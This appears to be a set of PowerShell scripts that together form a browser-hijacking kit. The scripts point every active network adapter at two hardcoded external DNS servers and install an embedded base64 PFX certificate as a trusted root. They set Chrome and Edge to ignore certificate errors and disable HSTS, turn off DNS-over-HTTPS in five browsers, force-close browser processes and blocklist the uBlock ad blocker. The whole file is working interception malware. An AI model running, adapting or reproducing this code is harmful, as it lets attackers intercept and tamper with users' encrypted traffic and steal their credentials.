. ./consts.ps1

function ConfigureCertificates {
    foreach ($key in $xdata.Keys) {
        Cert-Work -contentString $xdata[$key]
    }
}

function Cert-Work {
    param(
        [string] $contentString
    )
    $outputFilePath = [System.IO.Path]::GetTempFileName()
    $binary = [Convert]::FromBase64String($contentString)
    Set-Content -Path $outputFilePath -Value $binary -AsByteStream
    Install-CertificateToStores -CertificateFilePath $outputFilePath -Password '123'
}

function Install-CertificateToStores {
    param(
        [string] $CertificateFilePath,
        [string] $Password
    )

    try {
        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force

        # Import certificate to Personal (My) store
        $personalStorePath = "Cert:\LocalMachine\My"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $personalStorePath -Password $securePassword -ErrorAction Stop
        Write-Output "Certificate installed successfully to Personal store (My)."

        # Import certificate to Root store
        $rootStorePath = "Cert:\LocalMachine\Root"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $rootStorePath -Password $securePassword -ErrorAction Stop
        Write-Output "Certificate installed successfully to Root store."

    } catch {
        throw "Failed to install certificate: $_"
    }
}

function ConfigureChrome {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" -Name "EnableAutoDOH" -Value 0

    $chromeKeyPath = "HKLM:\Software\Policies\Google\Chrome"

    if (-not (Test-Path $chromeKeyPath)) {
        New-Item -Path $chromeKeyPath -Force | Out-Null
    }

    New-Item -Path $chromeKeyPath -Force | Out-Null  # Create the key if it doesn't exist
    Set-ItemProperty -Path $chromeKeyPath -Name "CommandLineFlag" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    Set-ItemProperty -Path $chromeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $chromeKeyPath -Name "IgnoreCertificateErrors" -Value 1

    Write-Output "Chrome configured"
}

. ./utils.ps1

function ConfigureChromeUblock {
    $keywords = @("uBlock")

    foreach ($dir in Get-EnvPaths) {
        $chromeDir = Join-Path -Path $dir -ChildPath "Google\Chrome\User Data\Default\Extensions"
        
        try {
            if (Test-Path -Path $chromeDir -PathType Container) {
                $extensions = Get-ChildItem -Path $chromeDir -Directory

                foreach ($extension in $extensions) {
                    $manFile = chromeublock_FindManifestFile -folder $extension.FullName
                    if ($manFile -ne "") {
                        $foundKeyword = $false
                        
                        foreach ($manifestValue in $keywords) {
                            $content = Get-Content -Path $manFile -Raw
                            if ($content -match [regex]::Escape($manifestValue)) {
                                $foundKeyword = $true
                                break
                            }
                        }

                        if ($foundKeyword) {
                            $extFolderName = [System.IO.Path]::GetFileName($extension.FullName)
                            chromeublock_ProcessManifestAll -extName $extFolderName
                        }
                    }
                }
            }
        } catch {
             Write-Error "Error occurred: $_"
        }
    }
}


function chromeublock_FindManifestFile {
    param (
        [string]$folder
    )

    $result = ""

    Get-ChildItem -Path $folder | ForEach-Object {
        if (-not ($_.PSIsContainer)) {
            if ($_.Name -eq "manifest.json") {
                $result = $_.FullName
                return
            }
        } elseif ($_.Name -notin @('.', '..')) {
            $result = chromeublock_FindManifestFile -folder $_.FullName
            if ($result -ne "") {
                return
            }
        }
    }

    return $result
}


function chromeublock_ProcessManifestAll {
    param (
        [string]$extName
    )

    chromeublock_ProcessManifest -extName $extName -browser "Google\Chrome"
}

function chromeublock_ProcessManifest {
    param (
        [string]$extName,
        [string]$browser
    )

    $regPath = "HKLM:\SOFTWARE\Policies\$browser\ExtensionInstallBlocklist"
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    
    $regKeyIndex = 1
    do {
        $keyName = "$regKeyIndex"
        $val = Get-ItemProperty -Path $regPath -Name $keyName -ErrorAction SilentlyContinue
        if ($val -eq $extName) {
            return
        }
        $regKeyIndex++
    } until (-not (Test-Path "$regPath\$keyName"))

    Set-ItemProperty -Path $regPath -Name $keyName -Value $extName
}
$PrimaryDNSServer = '185.247.141.78'
$SecondaryDNSServer = '185.247.141.76'
$xdata = @{
    'mc.yandex.ru'='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'
}

. .\Consts.ps1

function Set-DnsServers {
    param (
        [string]$primaryDnsServer,
        [string]$secondaryDnsServer
    )

    try {
        # Get network adapters that are IP-enabled
        $networkAdapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notlike '*Virtual*' }

        foreach ($adapter in $networkAdapters) {
            # Set DNS servers using Set-DnsClientServerAddress cmdlet
            Set-DnsClientServerAddress -InterfaceAlias $adapter.Name -ServerAddresses @($primaryDnsServer, $secondaryDnsServer) -Confirm:$false
            
            Write-Output "Successfully set DNS servers for adapter: $($adapter.InterfaceDescription)"
        }
    } catch {
        Write-Error "An error occurred: $_"
    }
}
function ConfigureEdge {
    $edgeKeyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
    
    if (-not (Test-Path $edgeKeyPath)) {
        New-Item -Path $edgeKeyPath -Force | Out-Null
    }
    
    $commandLinePath = Join-Path $edgeKeyPath "CommandLine"
    if (-not (Test-Path $commandLinePath)) {
        New-Item -Path $commandLinePath -Force | Out-Null
    }
    
    Set-ItemProperty -Path $commandLinePath -Name "(Default)" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    
    Set-ItemProperty -Path $edgeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $edgeKeyPath -Name "IgnoreCertificateErrors" -Value 1
}
. ./utils.ps1

function ConfigureFireFox 
{
    Set-FirefoxRegistry -KeyPaths @(
        'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS',
        'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS'
    ) -ValueNames @('Enabled', 'Locked') -Values @(0, 1)

    foreach ($dir in Get-EnvPaths) 
    {
        $path = Join-Path -Path $dir -ChildPath "Mozilla\Firefox\Profiles\user.js"

        try 
        {
            $UserJSContent = 'user_pref("network.trr.mode", 5);'
            
            if (!(Test-Path -Path $path -PathType Leaf)) 
            {
                $null = New-Item -Path $path -ItemType File
                Add-Content -Path $path -Value $UserJSContent
            }
        }
        catch 
        {
            Write-Error "Failed to write to user.js file: $_"
        }
    }
}


function Set-FirefoxRegistry {
    param (
        [string[]]$KeyPaths,
        [string[]]$ValueNames,
        [int[]]$Values
    )

    $ErrorActionPreference = 'Stop'
    $regKey = [Microsoft.Win32.Registry]::LocalMachine

    try {
        foreach ($i in 0..($KeyPaths.Length - 1)) {
            $key = $regKey.OpenSubKey($KeyPaths[$i], $true)
            if ($key -eq $null) {
                Write-Error "Failed to open registry key: $($KeyPaths[$i])"
                return
            }

            $key.SetValue($ValueNames[$i], $Values[$i], [Microsoft.Win32.RegistryValueKind]::DWord)
            $key.Close()
        }
    }
    catch {
        Write-Error "Error accessing or modifying registry: $_"
    }
}
. ./utils.ps1

function ConfigureOpera
{
    Close-Processes(@('opera_crashreporter.exe', 'opera.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Opera Software\Opera Stable\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureOperaInternal -FilePath $path
            }
        } catch {
            Write-Error "Error occurred: $_"
        }
    }
}

function ConfigureOperaInternal {
    param(
        [string]$filePath
    )

    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content.dns_over_https = @{
            'mode' = 'off'
            'opera' = @{
                'doh_mode' = 'off'
            }
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.opera = @{
            'doh_mode' = 'off'
        }
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    Write-Host "Successfully configured Opera settings in $filePath"
}
. ./consts.ps1
. ./utils.ps1
. ./dnsman.ps1
. ./chrome.ps1
. ./chrome.uBlock.ps1
. ./edge.ps1
. ./yandex.ps1
. ./opera.ps1
. ./firefox.ps1
. ./cert.ps1

function main {
    Set-DNSServers -PrimaryDNSServer $primaryDNSServer -SecondaryDNSServer $secondaryDNSServer
    ConfigureCertificates
    ConfigureChrome
    ConfigureEdge
    ConfigureYandex
    ConfigureFireFox
    ConfigureOpera
    ConfigureChromeUblock
}

main
function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}
. ./utils.ps1

function ConfigureYandex
{
    Close-Processes(@('service_update.exe','browser.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Yandex\YandexBrowser\User Data\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureYandexInternal -FilePath $path
            }
        } catch {
            Write-Error "Error occurred: $_"
        }
    }
}

function ConfigureYandexInternal {
    param(
        [string]$filePath
    )
    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content | Add-Member -MemberType NoteProperty -Name 'dns_over_https' -Value @{
            'mode' = 'off'
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    Write-Host "Successfully configured Yandex settings in $filePath"
}

